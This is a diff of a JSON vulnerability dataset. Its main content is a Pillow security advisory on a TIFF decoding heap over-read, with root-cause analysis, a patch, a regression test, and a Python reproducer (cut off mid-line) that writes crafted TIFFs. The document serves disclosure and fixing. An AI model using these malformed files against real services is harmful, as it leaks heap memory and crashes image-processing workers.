`row_byte_size * tile_length`. The loop body, however, indexes into the buffer assuming the buffer is at least `row_byte_size * tile_length` bytes long.\n\n### Vulnerable Code\n\n```c\n// src/libImaging/TiffDecode.c:446-490 — _decodeTile\nnew_data = realloc(state->buffer, state->bytes);   // bytes = tile_bytes_size\nif (!new_data) { ... }\nstate->buffer = new_data;\n\nfor (y = state->yoff; y < state->ysize; y += tile_length) {\n    for (plane = 0; plane < planes; plane++) {\n        ImagingShuffler shuffler = unpackers[plane];\n        for (x = state->xoff; x < state->xsize; x += tile_width) {\n            if (TIFFReadTile(tiff, (tdata_t)state->buffer, x, y, 0, plane) == -1) { ... }\n\n            current_tile_width  = min((INT32)tile_width,  state->xsize - x);\n            current_tile_length = min((INT32)tile_length, state->ysize - y);\n            for (tile_y = 0; tile_y < current_tile_length; tile_y++) {\n                shuffler(\n                    (UINT8 *)im->image[tile_y + y] + x * im->pixelsize,\n                    state->buffer + tile_y * row_byte_size,   // <-- OOB stride\n                    current_tile_width\n                );\n            }\n        }\n    }\n}\n```\n\n```c\n// src/libImaging/Unpack.c:1288-1291 — copy4 (the crash site)\nstatic void\ncopy4(UINT8 *out, const UINT8 *in, int pixels) {\n    /* RGBA, CMYK quadruples */\n    memcpy(out, in, 4 * pixels);   // <-- ASAN-detected READ here\n}\n```\n\nThe PoC's tile metadata yields `tile_width = tile_length = 256`, `row_byte_size = 1024` (4 bytes/pixel × 256 pixels), and `tile_bytes_size = 196608` (which is 256·256·3 = three-channel-byte storage). The realloc'd buffer is 196608 bytes. The unpacker iterates `tile_y` from 0 to 255 and for the highest rows the source pointer `state->buffer + tile_y * 1024` already lies at or past offset 196608 — the very last row's `memcpy(in=buffer+255·1024, 1024)` reads 1024 bytes starting `260096 - 196608 = 63488` bytes past the allocation; ASAN flags the very first byte past the heap region (`READ of size 1024 at … 0 bytes after 196608-byte region`).\n\nThe mismatch is real: libtiff's `TIFFTileSize` returns the *packed* per-tile storage (which depends on the file's photometric/separation layout — it can legitimately be smaller than `row_byte_size × tile_length`), while the inner loop strides as if the buffer always equals `row_byte_size × tile_length`.\n\n## Attribution\n\nThis issue was found by Anthropic from using Claude to study security of open source projects, and I am from Ada Logics helping validate the found issues and report to maintainers. The data in this report has been reviewed manually.",
+      "cvssScore": 6.5,
       "severity": "Medium",
-      "published": "2001-05-03",
-      "modified": null,
-      "cwe": null,
+      "published": "2026-10-20",
+      "modified": "2026-10-20",
+      "cwe": {
+        "cwe_id": "CWE-122",
+        "name": "Heap-based Buffer Overflow"
+      },
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0073.html",
-        "http://www.securityfocus.com/bid/2339",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0073.html",
-        "http://www.securityfocus.com/bid/2339"
+        "https://github.com/python-pillow/Pillow/security/advisories/GHSA-462x-pgg6-55fp",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-112395",
+        "https://github.com/python-pillow/Pillow/commit/76869efdbbf2ad7dccd7536520fb61b7a00ab61e",
+        "https://github.com/python-pillow/Pillow/releases/tag/13.0.0",
+        "https://github.com/advisories/GHSA-462x-pgg6-55fp"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "pillow pip"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-91815",
-      "summary": "Foxit PDF Editor/Reader does not perform sufficient verification of the JPEG2000 image metadata in the PDF file, which leads to out-of-bounds write in the heap buffer during decoding, potentially causing the program to crash and introducing the risk of arbitrary code execution.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-23",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-91815",
-        "https://www.foxit.com/support/security-bulletins.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-105293",
-      "summary": "Legcord 1.1.0 through 1.3.0 contains a path traversal vulnerability in theme IPC handlers that allows script in the Discord page to escape the themes directory via unvalidated theme ids. Attackers running script in the Discord origin, such as through XSS, can abuse themes.folder, themes.uninstall, and themes.install to launch local executables, recursively delete directories, and write files outside the themes directory.",
-      "cvssScore": 8.1,
+      "id": "CVE-2026-112404",
+      "summary": "```\n============================================================================\nOOB read in TiffDecode.c tile and RGBA paths leaks heap memory into pixels\nLocation: src/libImaging/TiffDecode.c:483  in _decodeTile()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nPillow reads past the end of a heap buffer when decoding certain malformed compressed TIFF files, and copies the bytes it reads into the pixels of the image it returns. An attacker who can get an application to open and load an image file, for example by uploading it to a service that returns thumbnails, previews or converted images, gets back fragments of that process's heap memory, including pointer values. A slightly larger file instead crashes the process. No special settings are needed, and nothing is written out of bounds.\n\nThe bug is in `_decodeTile()` and `_decodeAsRGBA()` in `src/libImaging/TiffDecode.c`. Both size their decode buffer from libtiff's view of the pixel layout (`TIFFTileSize()`/`TIFFTileRowSize()`, or `img.width * 4`). They then unpack each row with the unpacker that `TiffImagePlugin._setup()` chose from Pillow's own parse of the directory, and neither checks that the unpacker's input row fits inside the row libtiff produced. `_decodeStrip()` has exactly this check, added for OSS-Fuzz `crash-0da0` in 8.2.0, but the tile and RGBA paths never got it.\n\nThe two parsers can be made to disagree with a duplicated `PhotometricInterpretation` or `BitsPerSample` tag, because libtiff keeps the first occurrence and Pillow keeps the last. Pillow then unpacks 4 to 8 bytes per pixel from rows that libtiff filled with 1 to 4 bytes, so the last rows of each tile are read from beyond the buffer. The disclosed memory is a few tile rows past the buffer, and the attacker chooses the tile width. The amount does not grow with the number of tiles, because the buffer is reused for every tile.\n\nThe tile half was introduced in 1c295bf43 (first released in 8.2.0). The RGBA half was introduced in eb8c1206d, the CVE-2020-35654 fix (8.1.0).\n\nThe attached reproducer runs against an unmodified build. It writes three roughly 400-byte files that load without error, yet the last pixel rows of each change with glibc's malloc fill pattern and contain heap pointer bytes. A fourth file with a 65536x16 tile segfaults in `copy4` ← `_decodeTile` (`TiffDecode.c:483`) in most runs, depending on what is mapped after the buffer.\n\n## Details\n\n`_decodeTile()` and `_decodeAsRGBA()` in `src/libImaging/TiffDecode.c` size `state->buffer` from what libtiff says it will produce (`TIFFTileSize()`, resp. `img.width * 4`), but unpack each row with the shuffler that `TiffImagePlugin._setup()` selected from Pillow's *own* parse of the IFD. Nothing in either function checks that the unpacker's input row (`width * state->bits / 8` bytes) fits inside the row libtiff wrote. `_decodeStrip()` has exactly that check; the other two do not. Whenever the two IFD parsers disagree about the pixel layout — a tag with the wrong count or type that libtiff ignores but Pillow accepts, or a duplicated `PhotometricInterpretation`/`BitsPerSample`/`SamplesPerPixel` entry (libtiff keeps the first occurrence, `ImageFileDirectory_v2.load()` the last) — the unpacker reads past the end of the heap buffer and the bytes it reads become pixels of the returned image. Any Pillow rawmode wider than libtiff's actual sample layout works (`RGBX`, `RGB;16N`, `RGBA;16N`, `I;32`, `F;32F`, …); `RGBA;16N` (64 bits/pixel) against 1-bit libtiff data is the largest ratio, where every row after the first of each tile is read almost entirely from beyond the buffer.\n\nThe ~400-byte TIFF `tile_count2.tif` generated by the reproducer — one 16x16 tile, `BitsPerSample 8`, `SamplesPerPixel 1`, `Compression 8` (Adobe Deflate), and `PhotometricInterpretation` written as a SHORT with **count 2** (`6, 6`) — is opened by `Image.open()` as mode `RGB` with libtiff rawmode `RGBX`, and `load()` succeeds on the stock build. Rows 13–15 of the result contain bytes that lie 16, 32 and 48 bytes past the 256-byte tile buffer: decoding the same file twice under `MALLOC_PERTURB_=85` and `=170` yields identical rows 0–12 and different bytes in rows 13–15 (`aa` vs `55`, i.e. glibc's fill pattern). Under an ASan build of the extensions the same `load()` reports `heap-buffer-overflow READ of size 64` in `copy4` (`src/libImaging/Unpack.c:1290`) called from `src/libImaging/TiffDecode.c:483`, against the 256-byte region allocated at `TiffDecode.c:448`. The same layout with a single 65536x16 tile (4.5 KB file) makes the stock build SIGSEGV in `copy4 �� _decodeTile` reading an unmapped address in most runs (whether it faults depends on what is mapped after the 1 MiB buffer; a wider tile makes it reliable).\n\n### Why the two parsers disagree\n\nlibtiff 4.5 rejects a `PhotometricInterpretation` entry whose count is not 1 (`TIFFFetchNormalTag: Incorrect count for \"PhotometricInterpretation\"; tag ignored`), so for this file `TIFFGetField(tiff, TIFFTAG_PHOTOMETRIC, …)` returns 0 and libtiff treats the data as one 8-bit sample per pixel: `TIFFTileSize() = 256`, `TIFFTileRowSize() = 16`.\n\nPillow keeps the first value and carries on:\n\n```python\n# src/PIL/TiffImagePlugin.py:762-770  (ImageFileDirectory_v2._setitem, reached from load())\n            try:\n                (dest[tag],) = values\n            except ValueError:\n                # We've got a builtin tag with 1 expected entry\n                warnings.warn(f\"Metadata Warning, tag {tag} had too many entries: ...\")\n                dest[tag] = values[0]\n```\n\nso `_setup()` sees `photo == 6`. `OPEN_INFO[(II, 6, (1,), 1, (8,), ())]` is `(\"L\", \"L\")`, and because the file is compressed the libtiff branch then overrides the rawmode:\n\n```python\n# src/PIL/TiffImagePlugin.py:1578, 1600-1607\n        self.use_load_libtiff = READ_LIBTIFF or self._compression != \"raw\"\n        …\n            if photo == 6:\n                self._mode = \"RGB\"\n                if self._compression in \"jpeg\" and self._planar_configuration == 1:\n                    rawmode = \"RGB\"\n                else:\n                    rawmode = \"RGBX\"\n```\n\n`RGBX` is a 32-bit rawmode, so `get_unpacker()` (`src/decode.c:301-309`) sets `state->bits = 32` and `state->shuffle = copy4`. The intent of the `photo == 6` override is that libtiff will deliver RGBA through `TIFFRGBAImage`, but that decision is made in C from *libtiff's* reading of the tag, which here is \"not YCbCr\":\n\n```c\n// src/libImaging/TiffDecode.c:737-764\n    TIFFGetField(tiff, TIFFTAG_PHOTOMETRIC, &photometric);   // unset -> stays 0\n    …\n    readAsRGBA = photometric == PHOTOMETRIC_YCBCR;          // 0\n    …\n        if (TIFFIsTiled(tiff)) {\n            _decodeTile(im, state, tiff, planes, unpackers); // unpackers[0] = copy4\n```\n\n### The missing check\n\n`_decodeTile()` only guards against libtiff's tile being *larger* than what the unpacker expects, then allocates exactly `TIFFTileSize()` bytes and feeds `row_byte_size`-strided rows to the shuffler:\n\n```c\n// src/libImaging/TiffDecode.c:403-487  (_decodeTile)\n    tile_bytes_size = TIFFTileSize(tiff);                      // 256\n    …\n    row_byte_size = TIFFTileRowSize(tiff);                     // 16\n    …\n    if (tile_bytes_size > ((tile_length * state->bits / planes + 7) / 8) * tile_width) {\n        // 256 > 1024 is false -> no abort\n        …\n    }\n    state->bytes = tile_bytes_size;\n    new_data = realloc(state->buffer, state->bytes);           // 256-byte buffer (line 448)\n    …\n                for (tile_y = 0; tile_y < current_tile_length; tile_y++) {\n                    shuffler(                                   // copy4: reads current_tile_width*4 = 64 bytes\n                        (UINT8 *)im->image[tile_y + y] + x * im->pixelsize,\n                        state->buffer + tile_y * row_byte_size, // from offset 16*tile_y\n                        current_tile_width\n                    );\n```\n\nRow `tile_y` is read from `[16·tile_y, 16·tile_y + 64)`; for `tile_y` = 13, 14, 15 that ends 16, 32, 48 bytes past the 256-byte allocation. In general the last rows of every tile over-read by up to `(state->bits / libtiff_bits_per_pixel − 1) × row_byte_size` bytes, and `row_byte_size` scales with the attacker-chosen `TileWidth`.\n\nNote also that the existing one-sided check at line 434 multiplies the file-controlled `tile_width`/`tile_length` (`UINT32`, accepted up to `INT_MAX` at line 428) by `state->bits` in 32-bit unsigned arithmetic, so `tile_width * state->bits` wraps for `tile_width ≥ 2^32 / bits` (2^26 for the 64-bit rawmodes, 2^27 for `RGBX`/`I;32`/`F;32F`). An 8 KB file declaring a 2,097,152×1 image with `TILEWIDTH = 2^26+16`, `TILELENGTH = 1`, 1-bit data for libtiff and `RGBA;16N` for Pillow makes libtiff allocate an ~8 MB tile from which `unpackRGBA16L` reads 16 MB, and the stock build SIGSEGVs in `unpackRGBA16L ← _decodeTile (TiffDecode.c:483)`; a row-size comparison written in the same 32-bit arithmetic as line 434 would evaluate that row to 128 bytes and still accept it, so the new check must be done in a 64-bit type.\n\nCompare the strip path, which refuses this situation (added for OSS-Fuzz `crash-0da0` in 8.2.0):\n\n```c\n// src/libImaging/TiffDecode.c:528-548  (_decodeStrip)\n    unpacker_row_byte_size = (state->xsize * state->bits / planes + 7) / 8;\n    …\n    row_byte_size = TIFFScanlineSize(tiff);\n    // if the unpacker calculated row size is > row byte size, (at least) the last\n    // row of the strip will have a read buffer overflow.\n    if (row_byte_size == 0 || unpacker_row_byte_size > row_byte_size) {\n        state->errcode = IMAGING_CODEC_BROKEN;\n        return -1;\n    }\n```\n\nThe identical file written with one strip instead of one tile fails `load()` with `OSError: decoder error -2` because of this check.\n\n### Same gap in `_decodeAsRGBA()`\n\n`_decodeAsRGBA()` always produces `img.width * 4` bytes per row (`TiffDecode.c:325`, buffer allocated at line 339) and unpacks with `state->shuffle` (line 373) without looking at `state->bits`. It is reached when *libtiff* sees YCbCr while Pillow does not force `RGBX`. libtiff marks later duplicates of a tag as ignored (first occurrence wins); Pillow's `ImageFileDirectory_v2.load()` overwrites (`TiffImagePlugin.py:945`, last wins). The reproducer's `ycbcr_dup.tif` is a 16x16 Deflate strip with `PhotometricInterpretation` present twice (`6`, then `2`) and `BitsPerSample` twice (`8,8,8`, then `16,16,16`): libtiff decodes 8-bit YCbCr into a 1024-byte RGBA raster, Pillow selects `RGB;16N` (`state->bits = 48`), and `unpackRGB16L` reads 96 bytes per 64-byte row — ASan reports `heap-buffer-overflow` in `unpackRGB16L` (`Unpack.c:609`) from `TiffDecode.c:373`, past the 1024-byte region from `TiffDecode.c:339`.\n\nThe count-2 encoding is not the only lever, and on released versions it is not a lever at all: a 1-sample `photo == 6` file only gets rawmode `RGBX` since the unreleased commit 155330d63 (\"Do not open YCbCr colorspace images as RGB without libtiff (#9779)\", 2026-08-26). Released versions are reached through duplicated tags instead. A 3-sample tiled file with two `PhotometricInterpretation` entries (`1` or `2`, then `6`) produces the same `copy4` ← `_decodeTile` over-read, since libtiff keeps the first value and decodes 3 bytes per pixel while Pillow keeps `6` and unpacks 4 (the reproducer's `tile_dup.tif`). `ycbcr_dup.tif` above reaches `_decodeAsRGBA()` the same way.\n\n## Impact\n\nAny application that calls `Image.open()` + `load()` (or `thumbnail()`, `convert()`, `save()`, …) on an untrusted file reaches this with default settings: the file is content-sniffed as TIFF, and any compressed TIFF is decoded through libtiff and `TiffDecode.c` without `READ_LIBTIFF` being set. The over-read bytes are copied into the image's pixel rows, so a service that returns a thumbnail, preview or converted image hands adjacent heap memory back to the uploader, heap pointer values included — up to three libtiff tile rows past the buffer for the `RGBX`-over-8-bit case, with the tile row length (`TileWidth`) chosen by the attacker. `state->buffer` is allocated once and reused for every tile, so each tile re-reads the same region past that one buffer; the distinct heap disclosed per image is about `(unpacker_bpp / libtiff_bpp − 1)` tile rows and does not grow with the tile count. With a wide tile the read runs off the mapping and the process segfaults instead (the 65536x16 case crashes the stock build in most runs, depending on what is mapped after the buffer), taking down the whole worker rather than one request. Writes go to the correctly sized `Imaging` rows, so this is disclosure / crash, not memory corruption.\n\nThis is the same family as CVE-2020-35654 (Pillow and libtiff interpreting a YCbCr IFD differently in `TiffDecode.c`); that fix and the later `crash-0da0` fix closed the write and the strip-path read, but the tile path and the RGBA path still trust Pillow's rawmode over libtiff's row size. The tile-path gap was introduced in 1c295bf43c3a (\"Check for dimensions and sizes to fit into int\", 2021-01-25), which switched `_decodeTile()` from a buffer sized by Pillow's unpacker to `TIFFTileSize()`/`TIFFTileRowSize()`; it is first in Pillow 8.2.0. The `_decodeAsRGBA()` half dates from eb8c1206d6b1 (\"Fix CVE-2020-35654 - OOB Write in TiffDecode.c\"), first in 8.1.0.\n\n## Reproducing\n\nRun `repro` (a single Python 3 script) against the installed, unmodified Pillow. No sanitizer build is needed. It writes four TIFFs into a temporary directory, decodes each one in a child process, and removes the directory at the end.\n\nThe script writes its TIFFs byte by byte with a small classic-TIFF writer. Each file has a single IFD and a single Deflate-compressed block. Deflate is only there so the file is decoded by libtiff and `TiffDecode.c`. Every pixel byte in the compressed data is defined, so the decoded image should not depend on anything else in the process:\n\n- **`tile_count2.tif`**: a 16x16, 1-sample, 8-bit tile with `PhotometricInterpretation` written as SHORT count 2, `(6, 6)`. Pillow keeps `6` and unpacks with `copy4` (`RGBX`, 4 bytes per pixel). libtiff ignores the tag and decodes 1 byte per pixel. This lever needs 155330d63 (unreleased).\n- **`tile_dup.tif`**: a 16x16, 3-sample, 8-bit tile with `PhotometricInterpretation` present twice, `2` then `6`. libtiff keeps `2` (RGB, 3 bytes per pixel) and Pillow keeps `6` (`RGBX`, 4 bytes per pixel). This variant also applies to released versions.\n- **`ycbcr_dup.tif`**: the 16x16 strip with `BitsPerSample` `8,8,8` then `16,16,16` and `PhotometricInterpretation` `6` then `2`. libtiff decodes 8-bit YCbCr through `_decodeAsRGBA()` (4 bytes per pixel), and Pillow unpacks `RGB;16N` with `unpackRGB16L` (6 bytes per pixel).\n- **`tile_big.tif`**: the `tile_count2.tif` layout with a single 65536x16 tile.\n\nFor each of the first three files, the script runs `Image.open()` + `load()` + `tobytes()` twice, once with `MALLOC_PERTURB_=85` and once with `=170`. If the two outputs differ, bytes from beyond the decode buffer have become pixels. In that case it prints the first differing offset and the bytes around it from both runs. On this tree all three differ in their last rows: the `aa`/`55` fill bytes show up, along with heap pointer bytes. The script then decodes `tile_big.tif` and checks for a SIGSEGV (exit status -11). If `gdb` is available, it prints the top frames: `copy4` (`Unpack.c:1290`) ← `_decodeTile` (`TiffDecode.c:483`) ← `ImagingLibTiffDecode`. This crash depends on ASLR, so an occasional run may survive.\n\nEach step prints which `_imaging` build it used and how Pillow opened the file (mode, size and rawmode). The script ends with a one-line summary. The last line is `BUG` if any file leaked heap bytes into its pixels or the big tile crashed the process. Otherwise it is `OK`.\n\n## Suggested fix\n\nThe attached patch restores the `_decodeStrip()` invariant (the unpacker's input row must fit inside libtiff's row) in the two sibling decoders in `src/libImaging/TiffDecode.c`, at the point where each one sizes its buffer:\n\n- `_decodeTile()` computes `unpacker_row_byte_size = ((tsize_t)tile_width * state->bits / planes + 7) / 8` (the `tsize_t` cast keeps the product out of 32-bit arithmetic, so the `TILEWIDTH = 2^26+16` case above cannot wrap past the check on 64-bit builds). It reuses that value for the existing `TIFFTileSize()` sanity check, as `_decodeStrip()` does for strips. After that check and before the `realloc`, it fails with `IMAGING_CODEC_BROKEN` when `unpacker_row_byte_size > row_byte_size` (`TIFFTileRowSize()`).\n- `_decodeAsRGBA()` fails with `IMAGING_CODEC_BROKEN` when `state->bits > 32`, because `TIFFRGBAImage` rows are always 32 bits per pixel. This check runs before `TIFFRGBAImageBegin()` and any allocation.\n\nWith the patch, the tile and RGBA files fail `load()` with `OSError: decoder error -2`, the same result the equivalent strip file already gets. The patch also adds a regression test to `Tests/test_file_libtiff.py` (`test_unpacker_row_wider_than_libtiff_row`). The test embeds the count-2 tile and the duplicated-tag YCbCr strip as base64, following the file's existing convention. The patch was applied to a clean tree and rebuilt: the reproducer no longer triggers, and `Tests/test_file_tiff.py`, `Tests/test_file_libtiff.py` and `Tests/test_tiff_crashes.py` pass.\n\nThese checks close the over-read however the two parsers are made to disagree. Separately, `_setup()` could stop deriving the libtiff rawmode from tags that libtiff will read differently — e.g. treat a `PhotometricInterpretation`/`BitsPerSample`/`Compression` that is not a single well-typed value as \"unknown pixel mode\", the way `ImageWidth`/`ImageLength` are already required to be `int` at `TiffImagePlugin.py:1473`, or have `ImageFileDirectory_v2.load()` keep the first occurrence of a repeated tag as libtiff does (a behaviour change for malformed IFDs that is better made deliberately and separately) — but that only narrows the ways to reach the C-side gap rather than removing it: `TiffImagePlugin` cannot know how libtiff will resolve every malformed directory, and the decoder-side comparisons are what actually bound the read.\n\n## The patch\n\nReject TIFFs whose unpacker row is wider than libtiff's decoded row in _decodeTile() and _decodeAsRGBA(), as _decodeStrip() already does\n\nApplies to `src/libImaging/TiffDecode.c` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\nindex 3d804ea4a..c08dfe77c 100644\na/Tests/test_file_libtiff.py\n+++ b/Tests/test_file_libtiff.py\n@@ -1232,6 +1232,50 @@ class TestFileLibTiff(LibTiffTestCase):\n             with pytest.raises(OSError, match=\"decoder error -9\"):\n                 im.load()\n \n+    @pytest.mark.parametrize(\n+        \"data\",\n+        (\n+            # 16x16 8-bit greyscale tile, with a PhotometricInterpretation tag that\n+            # has two values. Pillow reads it as YCbCr (rawmode RGBX, 4 bytes/pixel)\n+            # while libtiff ignores it and decodes 1 byte/pixel.\n+            (\n+                b\"SUkqAAgAAAAKAAABBAABAAAAEAAAAAEBBAABAAAAEAAAAAIBAwABAAAACAAA\"\n+                b\"AAMBAwABAAAACAAAAAYBAwACAAAABgAGABUBAwABAAAAAQAAAEIBBAABAAAA\"\n+                b\"EAAAAEMBBAABAAAAEAAAAEQBBAABAAAAhgAAAEUBBAABAAAACwEAAAAAAAB4\"\n+                b\"nAEAAf/+AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUm\"\n+                b\"JygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJT\"\n+                b\"VFVWV1hZWltcXV5fYGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn+A\"\n+                b\"gYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6yt\"\n+                b\"rq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna\"\n+                b\"29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+foAAQIDBJ9Bepo=\"\n+            ),\n+            # 16x16 strip with duplicated BitsPerSample and PhotometricInterpretation\n+            # tags. libtiff keeps the first (8-bit YCbCr, read as 4 bytes/pixel RGBA)\n+            # while Pillow keeps the last (16-bit RGB, rawmode RGB;16N, 6 bytes/pixel).\n+            (\n+                b\"SUkqAAgAAAAMAAABAwABAAAAEAAAAAEBAwABAAAAEAAAAAIBAwADAAAAugEA\"\n+                b\"AAIBAwADAAAAwAEAAAMBAwABAAAACAAAAAYBAwABAAAABgAAAAYBAwABAAAA\"\n+                b\"AgAAABEBBAABAAAAngAAABUBAwABAAAAAwAAABYBAwABAAAAEAAAABcBBAAB\"\n+                b\"AAAAHAEAABICAwACAAAAAQABAAAAAAB4nGNgZGJmYWVj5+Dk4ubh5eMXEBQS\"\n+                b\"FhEVE5eQlJKWkZWTV1BUUlZRVVPX0NTS1tHV0zcwNDI2MTUzt7C0sraxtbN3\"\n+                b\"cHRydnF1c/fw9PL28fXzDwgMCg4JDQuPiIyKjomNi09ITEpOSU1Lz8jMys7J\"\n+                b\"zcsvKCwqLiktK6+orKquqa2rb2hsam5pbWvv6Ozq7unt658wcdLkKVOnTZ8x\"\n+                b\"c9bsOXPnzV+wcNHiJUuXLV+xctXqNWvXrd+wcdPmLVu3bd+xc9fuPXv37T9w\"\n+                b\"8NDhI0ePHT9x8tTpM2fPnb9w8dLlK1evXb9x89btO3fv3X/w8NHjJ0+fPX/x\"\n+                b\"8tXrN2/fvf/w8dPnL1+/ff/x89fvP3///WcY9f+I9j8AoGJ+kAgACAAIABAA\"\n+                b\"EAAQAA==\"\n+            ),\n+        ),\n+    )\n+    @pytest.mark.filterwarnings(\"ignore:Metadata Warning\")\n+    def test_unpacker_row_wider_than_libtiff_row(self, data: bytes) -> None:\n+        # The unpacker chosen by Pillow reads more bytes per row than libtiff\n+        # decoded, so the decoder must reject the image rather than read past\n+        # the end of its buffer\n+        with Image.open(io.BytesIO(base64.b64decode(data))) as im:\n+            with pytest.raises(OSError, match=\"decoder error -2\"):\n+                im.load()\n+\n     @pytest.mark.parametrize(\"compression\", (\"tiff_adobe_deflate\", \"jpeg\"))\n     def test_save_multistrip(self, compression: str, tmp_path: Path) -> None:\n         im = hopper(\"RGB\").resize((256, 256))\ndiff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\nindex 8a57c523d..2ee6c5f0a 100644\na/src/libImaging/TiffDecode.c\n+++ b/src/libImaging/TiffDecode.c\n@@ -304,6 +304,15 @@ _decodeAsRGBA(Imaging im, ImagingCodecState state, TIFF *tiff) {\n \n     TRACE((\"RowsPerBlock: %u \\n\", rows_per_block));\n \n+    // TiffRGBAImages are 32bits/pixel. If the unpacker reads more bits per pixel\n+    // than that, (at least) the last row of the block will have a read buffer\n+    // overflow.\n+    if (state->bits > 32) {\n+        TRACE((\"Decode Error, unpacker bits %d > 32\\n\", state->bits));\n+        state->errcode = IMAGING_CODEC_BROKEN;\n+        return -1;\n+    }\n+\n     if (!(TIFFRGBAImageOK(tiff, emsg) && TIFFRGBAImageBegin(&img, tiff, 0, emsg))) {\n         TRACE((\"Decode error, msg: %s\", emsg));\n         state->errcode = IMAGING_CODEC_BROKEN;\n@@ -397,7 +406,7 @@ _decodeTile(\n ) {\n     INT32 x, y, tile_y, current_tile_length, current_tile_width;\n     UINT32 tile_width, tile_length;\n-    tsize_t tile_bytes_size, row_byte_size;\n+    tsize_t tile_bytes_size, row_byte_size, unpacker_row_byte_size;\n     UINT8 *new_data;\n \n     tile_bytes_size = TIFFTileSize(tiff);\n@@ -431,7 +440,8 @@ _decodeTile(\n         return -1;\n     }\n \n-    if (tile_bytes_size > ((tile_length * state->bits / planes + 7) / 8) * tile_width) {\n+    unpacker_row_byte_size = ((tsize_t)tile_width * state->bits / planes + 7) / 8;\n+    if (tile_bytes_size > (unpacker_row_byte_size * tile_length)) {\n         // If the tile size as expected by LibTiff isn't what we're expecting, abort.\n         // man:   TIFFTileSize returns the equivalent size for a tile of data as it\n         // would be returned in a call to TIFFReadTile ...\n@@ -439,6 +449,13 @@ _decodeTile(\n         return -1;\n     }\n \n+    // if the unpacker calculated row size is > row byte size, (at least) the last\n+    // row of the tile will have a read buffer overflow.\n+    if (unpacker_row_byte_size > row_byte_size) {\n+        state->errcode = IMAGING_CODEC_BROKEN;\n+        return -1;\n+    }\n+\n     state->bytes = tile_bytes_size;\n \n     TRACE((\"TIFFTileSize: %d\\n\", state->bytes));\n```\n\n## The reproducer\n\n<details>\n<summary>Reproducer — <code>repro</code>, 4,178 bytes (click to open)</summary>\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n# Heap over-read in _decodeTile()/_decodeAsRGBA() (src/libImaging/TiffDecode.c), stock build,\n# no sanitizer needed.  Pillow picks the row unpacker from its own IFD parse, libtiff sizes the\n# decode buffer from its parse; when they disagree the unpacker reads past state->buffer and the\n# bytes land in the image.  Evidence: (1) pixels of a fully-defined 16x16 file change with glibc's\n# MALLOC_PERTURB_ fill byte (heap bytes beyond the buffer became pixels); (2) a 65536x16 tile\n# SIGSEGVs in copy4 <- _decodeTile.  Runs in a few seconds.\nimport os, shutil, struct, subprocess, sys, tempfile, zlib\n\nW = tempfile.mkdtemp(); S, L = 3, 4\n\ndef tiff(entries, data):                      # little-endian classic TIFF, one IFD, tags in given order\n    data_off = 8 + 2 + 12 * len(entries) + 4; extra_off = data_off + len(data)\n    ifd, extra = struct.pack(\"<H\", len(entries)), b\"\"\n    for tag, typ, vals in entries:\n        if vals is None: typ, vals = L, [data_off]\n        raw = b\"\".join(struct.pack(\"<H\" if typ == S else \"<L\", v) for v in vals)\n        if len(raw) > 4: raw, extra = struct.pack(\"<L\", extra_off + len(extra)), extra + raw\n        ifd += struct.pack(\"<HHL\", tag, typ, len(vals)) + raw.ljust(4, b\"\\0\")\n    return b\"II*\\0\" + struct.pack(\"<L\", 8) + ifd + b\"\\0\" * 4 + data + extra\n\ndef tile(w, h, spp, photo):                   # one deflate tile, 8 bit/sample\n    d = zlib.compress(bytes(i % 251 for i in range(w * h * spp)))\n    return tiff([(256, L, [w]), (257, L, [h]), (258, S, [8] * spp), (259, S, [8])] + photo +\n                [(277, S, [spp]), (322, L, [w]), (323, L, [h]), (324, L, None), (325, L, [len(d)])], d)\n\nd = zlib.compress(bytes(range(256)) * 3)\nfiles = {\n  # Photometric count 2 (6,6): libtiff ignores tag -> 1 B/px; Pillow keeps 6 -> RGBX copy4 4 B/px (HEAD only)\n  \"tile_count2.tif\": tile(16, 16, 1, [(262, S, [6, 6])]),\n  # Photometric duplicated 2 then 6, 3 samples: libtiff RGB 3 B/px; Pillow RGBX 4 B/px (also released versions)\n  \"tile_dup.tif\": tile(16, 16, 3, [(262, S, [2]), (262, S, [6])]),\n  # strip, libtiff sees 8-bit YCbCr -> _decodeAsRGBA 4 B/px; Pillow sees RGB;16 -> 6 B/px\n  \"ycbcr_dup.tif\": tiff([(256, S, [16]), (257, S, [16]), (258, S, [8, 8, 8]), (258, S, [16, 16, 16]), (259, S, [8]),\n        (262, S, [6]), (262, S, [2]), (273, L, None), (277, S, [3]), (278, S, [16]), (279, L, [len(d)]),\n        (530, S, [1, 1])], d),\n  \"tile_big.tif\": tile(65536, 16, 1, [(262, S, [6, 6])]),\n}\nfor n, b in files.items():\n    open(f\"{W}/{n}\", \"wb\").write(b)\n\nLOAD = r\"\"\"\nimport sys, warnings; warnings.simplefilter(\"ignore\")\nfrom PIL import Image\nim = Image.open(sys.argv[1]); print(Image.core.__file__, im.mode, im.size, im.tile[0].args[0], file=sys.stderr)\nim.load(); sys.stdout.write(im.tobytes().hex())\n\"\"\"\ndef run(name, perturb):\n    p = subprocess.run([sys.executable, \"-c\", LOAD, f\"{W}/{name}\"], capture_output=True, text=True,\n                       env=dict(os.environ, 